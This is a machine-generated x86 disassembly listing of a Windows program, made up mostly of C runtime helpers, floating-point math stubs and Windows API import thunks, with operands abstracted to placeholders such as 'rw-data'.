mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_438eac
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_438eb4
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_438eba
mov eax [ ecx ]
retn
sub_438ebd
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_438ec5
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_439015
push 0x7
call sub_42f374
pop ecx
retn
sub_439201
push 0x7
call sub_42f374
pop ecx
retn
sub_439413
mov eax rw-data
retn
sub_43943f
mov eax [ rw-data ]
retn
sub_439445
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_439457
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_439469
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_439479
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_439489
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_43949b
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_4394ad
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_4394b3
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_4394b9
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_4394cb
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_43957b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0x4 ]
pop ebp
retn
pop ebp
jmp sub_439554
sub_439932
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_439944
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_439954
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_439966
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_43996c
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_43a131
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_43a299
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43a2a9
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_43a2bb
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_43a2c1
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_43ad47
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43ad57
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43ad67
push [ ecx ]
call sub_43aeb9
pop ecx
retn
sub_43ad70
mov eax [ ecx ]
retn
sub_43ad73
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x8 ]
cmp eax ecx
sbb eax eax
and eax ecx
pop ebp
retn
sub_43ad86
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
add eax 0x8
sub_43b1a5
push 0x4
call sub_42f374
pop ecx
retn
sub_43bc0d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
or [ esi ] 0x104
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
pop esi
pop ebp
retn
sub_43c4d1
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43c4dc
sub_43c549
mov eax [ rw-data ]
retn
sub_43c54f
call [ GetProcessHeap@IAT ]
test eax eax
mov [ rw-data ] eax
setne al
retn
sub_43c560
and [ rw-data ] 0x0
mov al 0x1
retn
sub_43c56a
mov eax [ rw-data ]
retn
sub_43c640
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_43c6a6
mov ecx [ ebp + 0x10 ]
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_43c6da
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_43c70f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43c721
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43c733
push [ ecx ]
call sub_42f32c
pop ecx
retn
sub_43c73c
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
retn
sub_43c74f
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_43c7e1
push 0x3
call sub_42f374
pop ecx
retn
sub_43c8d2
mov eax ecx
retn
sub_43c930
call sub_42fa1d
add eax 0x4
retn
sub_43caf9
cmp [ ebp - 0x1d ] 0x0
je r-xdata
retn
push 0x3
call sub_42f374
pop ecx
sub_43ccdb
push 0x3
call sub_42f374
pop ecx
retn
sub_43d2e3
push 0x1f80
call sub_445ab6
pop ecx
retn
sub_43d8a0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
and eax 0xfff7ffff
push eax
push [ ebp + 0x8 ]
call sub_43d59e
pop ecx
pop ecx
pop ebp
retn
sub_43dafd
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43df3d
mov ecx [ ebp + 0x10 ]
push [ ecx ]
call sub_4390d5
pop ecx
retn
sub_43df71
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43df83
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43df93
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43dfa5
push [ ecx ]
call sub_43901e
pop ecx
retn
sub_43e003
push [ ecx ]
call sub_4390d5
pop ecx
retn
sub_43e3db
retn
sub_43edaa
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43e3dc
add esp 0xc
pop ebp
retn
sub_43edf7
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43e53c
sub_43ee73
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43e48c
add esp 0xc
pop ebp
retn
sub_43eec0
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43e608
sub_43f32e
push esi
call sub_4390d5
pop ecx
retn
sub_43f42f
push edi
call sub_4390d5
pop ecx
retn
sub_43f5f4
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43f26c
sub_43f5ff
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43f45c
sub_43f60a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43f357
add esp 0x10
pop ebp
retn
sub_43f692
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f374
pop ecx
retn
sub_43f6c6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43f6d8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43f6e8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43f6fa
push [ ecx ]
call sub_42f32c
pop ecx
retn
sub_43f703
mov eax [ ecx ]
movzx eax [ eax ]
push eax
call sub_43f736
pop ecx
retn
sub_43f710
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_43f85d
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f873
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f8a6
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f905
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f918
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f92e
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f941
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f957
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f96a
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f97d
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f990
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f9a6
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_43f824
pop ecx
pop ecx
pop ebp
retn
sub_43f9b9
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f9cf
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43f9e5
mov edi edi
push ebp
mov ebp esp
mov eax 0x80
cmp [ ebp + 0x8 ] ax
sbb eax eax
neg eax
pop ebp
retn
sub_43fa16
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43fa29
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43fa3c
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43fa52
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43fa65
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43fa7b
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43fa8e
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43faa1
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43fab4
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
sub_43faca
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_4412a0
mov [ ecx ] 0x0
mov eax ecx
retn
sub_4412e0
cmp [ ecx + 0x8 ] 0x0
je r-xdata
retn
push ecx
call sub_446d3a
pop ecx
sub_441420
mov edi edi
push ebp
mov ebp esp
bsr ecx [ ebp + 0x8 ]
je r-xdata
mov eax 0x20
pop ebp
retn
mov eax 0x1f
sub eax ecx
pop ebp
retn
sub_441df0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mul [ ebp + 0x10 ]
mov ecx eax
mov eax [ ebp + 0x8 ]
mul [ ebp + 0x10 ]
add edx ecx
pop ebp
retn
sub_443c98
fxch st1
fstp st0
retn
sub_443ca6
fstp st0
fldz
retn
sub_443cab
fstp st0
fstp st0
fldz
test ch ch
je r-xdata
retn
fchs
sub_443cb8
fstp st0
fstp st0
fld1
retn
sub_443cbf
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
fadd [ r--data ]
retn
mov [ ebp - 0x90 ] 0x0
retn
sub_443cea
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0x90 ] 0x0
jmp r-xdata
faddp st1
retn
sub_443d53
fstp st0
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_443d66
mov [ ebp - 0x90 ] 0x1
or cl cl
retn
sub_443d70
fstp st0
fstp st0
fld [ r--data ]
or ch ch
je r-xdata
or cl cl
je r-xdata
fchs
retn
fld [ r--data ]
fmulp st1
sub_443d8d
or cl cl
je r-xdata
retn
fchs
sub_443d94
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
mov [ rw-data ] ecx
pop ebp
retn
sub_443eb4
push 0xa
call IsProcessorFeaturePresent
mov [ rw-data ] eax
xor eax eax
retn
sub_443f00
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff0
fstp [ esp ]
movq xmm0 [ esp ]
call sub_443f1e
leave
retn
sub_443f18
movlpd xmm0 [ esp + 0x4 ]
sub_4440b0
fld st0
frndint
fsubr st1
fxch st1
fchs
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_4440c5
mov edx [ esp + 0x4 ]
and edx 0x300
or edx 0x7f
mov [ esp + 0x6 ] dx
fldcw [ esp + 0x6 ]
retn
sub_4440dc
test eax 0x80000
je r-xdata
fadd [ r--data ]
mov eax 0x0
retn
mov eax 0x0
retn
sub_444138
mov eax [ esp + 0x8 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ esp + 0x8 ]
retn
retn
sub_4442a0
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff0
fstp [ esp ]
movq xmm0 [ esp ]
call sub_4442be
leave
retn
sub_4442b8
movlpd xmm0 [ esp + 0x4 ]
sub_444468
retn
sub_44499b
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4448ea
sub_4449f0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444a07
add esp 0xc
pop ebp
retn
sub_444a94
call sub_437d97
xor ecx ecx
test al al
sete cl
mov eax ecx
retn
sub_445780
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4452a3
add esp 0x14
pop ebp
retn
sub_4457bc
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_445302
add esp 0x14
pop ebp
retn
sub_445a1d
cmp [ rw-data ] 0x1
push esi
jl r-xdata
xor esi esi
call sub_445a98
mov esi eax
and esi 0x3f
call sub_445a79
jmp r-xdata
mov eax esi
pop esi
retn
sub_445a79
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x1
jl r-xdata
mov esp ebp
pop ebp
retn
stmxcsr [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0xffffffc0
ldmxcsr [ ebp - 0x4 ]
sub_445ae5
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp [ eax ] 0xc000001d
je r-xdata
xor eax eax
retn
sub_445b2c
mov edi edi
push ebp
mov ebp esp
call sub_445a98
mov ecx [ ebp + 0x8 ]
and ecx 0x3f
or eax ecx
push eax
call sub_445ab6
pop ecx
pop ebp
retn
sub_445b47
cmp [ rw-data ] 0x1
jl r-xdata
xor eax eax
retn
call sub_445a98
and eax 0x3f
retn
sub_445b5c
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_445bf6
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_445cd1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_445c08
pop ecx
pop ecx
pop ebp
retn
sub_445f50
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4390d5
pop ecx
retn
sub_445f84
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x8
sub_445f9a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_445fac
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_446001
push [ ecx ]
call sub_43901e
pop ecx
retn
sub_44600a
push [ ecx ]
call sub_4390d5
pop ecx
retn
sub_44688d
push esi
call sub_4390d5
pop ecx
retn
sub_446ccb
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_446cea
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_447437
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fadd [ ebp + 0x10 ]
pop ebp
retn
sub_448030
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff0
fstp [ esp ]
movq xmm0 [ esp ]
call sub_44804e
leave
retn
sub_448048
movlpd xmm0 [ esp + 0x4 ]
j_sub_443cb8
jmp sub_443cb8
sub_448328
fstp st0
fstp st0
fld [ r--data ]
mov [ ebp - 0x90 ] 0x2
retn
sub_448354
mov [ ebp - 0x90 ] 0x2
fstp st0
fld [ r--data ]
retn
sub_448364
or cl cl
jne r-xdata
jmp r-xdata
retn
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_448369
fldlg2
jmp r-xdata
fxch st1
or cl cl
jne r-xdata
jmp sub_443d53
fyl2x
retn
sub_44836d
fldln2
fxch st1
or cl cl
jne r-xdata
jmp sub_443d53
fyl2x
retn
j_sub_443cb8#2
jmp sub_443cb8
sub_4483b9
fstp st0
jmp r-xdata
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_4483ef
fstp st0
fstp st0
fld [ r--data ]
mov [ ebp - 0x90 ] 0x3
retn
sub_448401
or cl cl
jne r-xdata
jmp sub_443ca6
fstp st0
fld [ r--data ]
retn
sub_448674
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0xe ]
shr eax 0x4
and eax 0x7ff
sub eax 0x3fe
cwde
pop ebp
retn
sub_4488d8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
frndint
fstp [ ebp - 0x8 ]
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_448988
mov edi edi
push ebp
mov ebp esp
mov edx 0x7ff0
xor eax eax
mov ecx edx
and cx [ ebp + 0xe ]
cmp cx dx
setne al
pop ebp
retn
sub_448b4d
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
call sub_448d6d
add esp 0x10
pop ebp
retn
sub_448b6c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_448b86
add esp 0xc
pop ebp
retn
sub_448d6d
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
call sub_448d8c
add esp 0x10
pop ebp
retn
sub_449192
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_448ee7
sub_44919d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_448fee
UnhandledExceptionFilter
jmp [ UnhandledExceptionFilter@IAT ]
SetUnhandledExceptionFilter
jmp [ SetUnhandledExceptionFilter@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
TerminateProcess
jmp [ TerminateProcess@IAT ]
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
GetSystemTimeAsFileTime
jmp [ GetSystemTimeAsFileTime@IAT ]
InitializeSListHead
jmp [ InitializeSListHead@IAT ]
IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
GetStartupInfoW
jmp [ GetStartupInfoW@IAT ]
GetModuleHandleW
jmp [ GetModuleHandleW@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
GetLastError
jmp [ GetLastError@IAT ]
RaiseException
jmp [ RaiseException@IAT ]
InterlockedPushEntrySList
jmp [ InterlockedPushEntrySList@IAT ]
InterlockedFlushSList
jmp [ InterlockedFlushSList@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
EncodePointer
jmp [ EncodePointer@IAT ]
InitializeCriticalSectionAndSpinCount
jmp [ InitializeCriticalSectionAndSpinCount@IAT ]
TlsAlloc
jmp [ TlsAlloc@IAT ]
TlsGetValue
jmp [ TlsGetValue@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
TlsFree
jmp [ TlsFree@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
LoadLibraryExW
jmp [ LoadLibraryExW@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
GetModuleHandleExW
jmp [ GetModuleHandleExW@IAT ]
GetStdHandle
jmp [ GetStdHandle@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
GetACP
jmp [ GetACP@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
GetCurrentThread
jmp [ GetCurrentThread@IAT ]
GetDateFormatW
jmp [ GetDateFormatW@IAT ]
GetTimeFormatW
jmp [ GetTimeFormatW@IAT ]
CompareStringW
jmp [ CompareStringW@IAT ]
LCMapStringW
jmp [ LCMapStringW@IAT ]
GetLocaleInfoW
jmp [ GetLocaleInfoW@IAT ]
IsValidLocale
jmp [ IsValidLocale@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
EnumSystemLocalesW
jmp [ EnumSystemLocalesW@IAT ]
GetFileType
jmp [ GetFileType@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
GetConsoleCP
jmp [ GetConsoleCP@IAT ]
GetConsoleMode
jmp [ GetConsoleMode@IAT ]
DecodePointer
jmp [ DecodePointer@IAT ]
OutputDebugStringA
jmp [ OutputDebugStringA@IAT ]
OutputDebugStringW
jmp [ OutputDebugStringW@IAT ]
WaitForSingleObjectEx
jmp [ WaitForSingleObjectEx@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileExA
jmp [ FindFirstFileExA@IAT ]
FindFirstFileExW
jmp [ FindFirstFileExW@IAT ]
FindNextFileA
jmp [ FindNextFileA@IAT ]
FindNextFileW
jmp [ FindNextFileW@IAT ]
IsValidCodePage
jmp [ IsValidCodePage@IAT ]
GetOEMCP
jmp [ GetOEMCP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
GetCommandLineW
jmp [ GetCommandLineW@IAT ]
GetEnvironmentStringsW
jmp [ GetEnvironmentStringsW@IAT ]
FreeEnvironmentStringsW
jmp [ FreeEnvironmentStringsW@IAT ]
SetEnvironmentVariableA
jmp [ SetEnvironmentVariableA@IAT ]
SetEnvironmentVariableW
jmp [ SetEnvironmentVariableW@IAT ]
SetStdHandle
jmp [ SetStdHandle@IAT ]
GetStringTypeW
jmp [ GetStringTypeW@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
SetConsoleCtrlHandler
jmp [ SetConsoleCtrlHandler@IAT ]
FlushFileBuffers
jmp [ FlushFileBuffers@IAT ]
CreateFileW
jmp [ CreateFileW@IAT ]
SetFilePointerEx
jmp [ SetFilePointerEx@IAT ]
WriteConsoleW
jmp [ WriteConsoleW@IAT ]
HeapSize
jmp [ HeapSize@IAT ]
HeapReAlloc
jmp [ HeapReAlloc@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ReadConsoleW
jmp [ ReadConsoleW@IAT ]
SystemFunction036
jmp [ SystemFunction036@IAT ]
sub_449599
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_449601
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx

sub_449616
mov ecx [ ebp - 0x10 ]
xor ecx ebp
sub_40c3ae
sub_449601
sub_449627
mov ecx [ ebp - 0x14 ]
xor ecx ebp
sub_40c3ae
sub_449601
sub_449809
mov ecx [ ebp - 0x1c ]
xor ecx ebp
sub_40c3ae
sub_40d2a6
sub_449960
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40c3c0
sub_449976
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40c3c0
sub_449b15
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov eax ecx
pop ebp
retn
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
sub_44caa2
int3
sub_44cdd0
push 0x318
mov eax [ ebp + 0x8 ]
push eax
call sub_40c397
add esp 0x8
retn
sub_44cde2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40c3ae
mov eax r--data
jmp sub_40d876
sub_44ce00
push 0x318
mov eax [ ebp - 0x102c ]
push eax
call sub_40c397
add esp 0x8
retn
sub_44ce15
lea ecx [ ebp - 0x1024 ]
jmp sub_401b30
sub_44ce20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1038 ]
xor ecx eax
call sub_40c3ae
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40c3ae
